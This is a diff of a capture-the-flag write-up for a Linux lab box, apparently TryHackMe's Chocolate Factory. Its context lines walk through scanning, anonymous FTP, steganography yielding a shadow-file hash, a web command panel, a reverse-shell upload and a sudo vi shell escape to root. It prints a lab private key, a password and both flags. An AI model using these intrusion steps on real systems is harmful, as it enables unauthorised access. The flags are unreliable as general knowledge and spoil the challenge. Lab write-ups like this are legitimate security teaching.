@@ -6,31 +6,31 @@
 
 <div align="center"> <img alt="Difficulty: Easy" src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-## TASK 1. Challenges
+### TASK 1. Challenges
 
-### Ques 1. Enter the key you found!
+#### Ques 1. Enter the key you found!
 ```bash
 '-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 ```
 
-### Ques 2. What is Charlie's password?  
+#### Ques 2. What is Charlie's password?  
 ```bash
 cn7824
 ```
 
-### Ques 4. Enter the user flag
+#### Ques 4. Enter the user flag
 ```bash
 flag{cd5509042371b34e4826e4838b522d2e}
 ```
 
-### Ques 5. Enter the root flag
+#### Ques 5. Enter the root flag
 ```bash
 flag{cec59161d338fef787fcb4e296b42124}
 
 ```
 
 
-## 1. So Let make a Nmap scan
+### 1. So Let make a Nmap scan
 ```bash
 ┌──(death㉿esther)-[~]
 └─$ nmap 10.10.14.239 -sV -Pn
@@ -52,11 +52,11 @@ PORT    STATE SERVICE    VERSION
 125/tcp open  locus-map?
 ```
 
-#### So FTP is open let check with default credential
+##### So FTP is open let check with default credential
 
-## 2. Let Check FTP
+### 2. Let Check FTP
 
-#### default credentials used to login
+##### default credentials used to login
 ```bash
 anonymous
 ```
@@ -74,7 +74,7 @@ Using binary mode to transfer files.
 ftp>
 ```
 
-### Oh we got a image here let get it on our system, Maybe there is some data we can retrive
+#### Oh we got a image here let get it on our system, Maybe there is some data we can retrive
 ```bash
                                                                                 
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
@@ -102,15 +102,15 @@ local: gum_room.jpg remote: gum_room.jpg
 ftp: No control connection for command
 ftp>
 ```
-## 3. Let do steganography 
-### I just enter at passphrase, there is no password
+### 3. Let do steganography 
+#### I just enter at passphrase, there is no password
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ steghide --extract  -sf gum_room.jpg                        
 Enter passphrase: 
 wrote extracted data to "b64.txt".
 ```
-### Here is a b64.txt , maybe base 64  , so let convert it directly
+#### Here is a b64.txt , maybe base 64  , so let convert it directly
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ cat b64.txt| base64 -d
@@ -177,7 +177,7 @@ statd:*:18451:0:99999:7:::
 _gvm:*:18496:0:99999:7:::
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
 ```
-### Oh so it /etc/passwd , here is the hash. let send it to hashcat 
+#### Oh so it /etc/passwd , here is the hash. let send it to hashcat 
 ```bash
 ──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ hashcat -m 1800 -a 3 hash /usr/share/wordlists/rockyou.txt
@@ -199,8 +199,8 @@ Optimizers applied:
 * Single-Salt
 * Brute-Force
 ````
-### Not able to crack hash using rockyou, let find another way.
-## 4. Let do directory search to get more info
+#### Not able to crack hash using rockyou, let find another way.
+### 4. Let do directory search to get more info
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ dirsearch -u 10.10.14.239 
@@ -256,28 +256,28 @@ lib.core.exceptions.RequestException: Request timeout: http://10.10.14.239/sql/s
 During handling of the above exception, another exception occurred:
 
 ```
-###  I got some error so but its okay we got page
-### Ok so i get two pages let check it out
+####  I got some error so but its okay we got page
+#### Ok so i get two pages let check it out
 
-### So it login page,
+#### So it login page,
 ![Screenshot from 2024-04-22 11-41-22](https://github.com/Esther7171/ChocolateFactory/assets/122229257/725db937-20c7-4046-9aac-3311a14be287)
 
 
-### This one is command execution panel.
+#### This one is command execution panel.
 
 ![Screenshot from 2024-04-22 11-40-45](https://github.com/Esther7171/ChocolateFactory/assets/122229257/1a68d2ad-7b6b-4204-9a87-83e1c71f933f)
 
-### Let try to run some basic commands.
+#### Let try to run some basic commands.
 
-#### By doing ```ls``` we got,
+##### By doing ```ls``` we got,
 ![Screenshot from 2024-04-22 11-42-13](https://github.com/Esther7171/ChocolateFactory/assets/122229257/e0260218-348e-4ea3-bc73-ebd3d62a918f)
 
-### Here is key let to cat
+#### Here is key let to cat
 So it in Non readable formate
 ![Screenshot from 2024-04-22 11-43-20](https://github.com/Esther7171/ChocolateFactory/assets/122229257/b3f71a96-87c8-4492-a082-95cc3a82c53a)
 
 
-### Let try to strings to read it 
+#### Let try to strings to read it 
 ![Screenshot from 2024-04-22 11-43-30](https://github.com/Esther7171/ChocolateFactory/assets/122229257/2949e129-9133-48ad-a588-3c067bca3d9a)
 
 
@@ -285,16 +285,16 @@ So it in Non readable formate
 
 /lib64/ld-linux-x86-64.so.2 libc.so.6 __isoc99_scanf puts __stack_chk_fail printf __cxa_finalize strcmp __libc_start_main GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable 5j %l %j %b %Z %R %J %b =9 AWAVI AUATL []A\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safe Bad name! ;*3$" GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry license.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata __stack_chk_fail@@GLIBC_2.4 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start strcmp@@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment 
 ```
-### here is key in 2 line
+#### here is key in 2 line
 ```bash
 '-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 ```
-### Its a base 64 let try to convert it
-### No it not as bas64 but look like..
+#### Its a base 64 let try to convert it
+#### No it not as bas64 but look like..
 
-### We got key , Let try to upload a reverse-shell here, so it in php formate let try php shell
+#### We got key , Let try to upload a reverse-shell here, so it in php formate let try php shell
 
-## 5. Let uploads
+### 5. Let uploads
 ```here are all the reverse-shell```
 ```bash
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
@@ -404,12 +404,12 @@ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
 G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
 -----END RSA PRIVATE KEY-----
 ```
-### Let give it permission 
+#### Let give it permission 
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ chmod 600 id_rsa            
 ```
-## 6. Let login with Ssh
+### 6. Let login with Ssh
 
 ```bash                                                                                            
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
@@ -461,12 +461,12 @@ See "man sudo_root" for details.
 
 charlie@chocolate-factory:/$ 
 ```
-### Let cat user.txt
+#### Let cat user.txt
    
 ```bash
 flag{cd5509042371b34e4826e4838b522d2e}
 ```
-## 7. Let escalate privileges
+### 7. Let escalate privileges
 ```bash
 charlie@chocolate-factory:/home/charlie$ sudo -l 
 Matching Defaults entries for charlie on chocolate-factory:
@@ -476,7 +476,7 @@ User charlie may run the following commands on chocolate-factory:
     (ALL : !root) NOPASSWD: /usr/bin/vi
 charlie@chocolate-factory:/home/charlie$ 
 ```
-### Ok so let make a visite to gtfobins
+#### Ok so let make a visite to gtfobins
 ```bash
 sudo vi -c ':!/bin/sh' /dev/null
 ```
@@ -487,8 +487,8 @@ charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
 root
 # 
 ```
-## We got root , Let find flag
-### Their is python file
+### We got root , Let find flag
+#### Their is python file
 ```bash
 teleport  teleport.pub	user.txt
 # cd /root
@@ -496,7 +496,7 @@ teleport  teleport.pub	user.txt
 root.py
 # 
 ```
-### Let see 
+#### Let see 
 ```bash
 # cat root.py
 from cryptography.fernet import Fernet
@@ -512,7 +512,7 @@ print(display1)
 print(display2)
 print(mess)# 
 ```
-### Maybe we need to enter the key we got at beginning
+#### Maybe we need to enter the key we got at beginning
 ```bash
 # cat root.py
 from cryptography.fernet import Fernet
@@ -557,5 +557,5 @@ __   __               _               _   _                 _____ _
 flag{cec59161d338fef787fcb4e296b42124}
 #
 ```
-# Done
+## Done
 🙂
